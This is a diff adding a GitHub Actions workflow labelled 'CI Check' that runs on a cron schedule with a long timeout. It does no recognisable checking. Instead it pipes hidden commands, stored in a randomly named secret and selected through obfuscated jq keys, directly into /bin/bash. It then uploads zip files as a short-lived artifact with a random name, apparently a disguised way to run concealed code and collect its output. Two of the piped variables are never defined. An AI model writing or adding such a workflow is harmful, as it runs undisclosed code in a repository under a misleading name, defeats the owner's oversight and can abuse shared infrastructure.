@@ -1,0 +1,30 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  main:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          yyel9: ${{ secrets.yyel9 }}
+        run: |
+          printf '%s' "$yyel9" | jq -r .mkpt006 | /bin/bash
+          printf '%s' "$zev70407" | jq -r .h2267 | /bin/bash
+          printf '%s' "$tmg5" | jq -r .h19915 | /bin/bash
+
+      - name: Archive output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: KbmvGIXg
+          path: "*.zip"
+          retention-days: 1
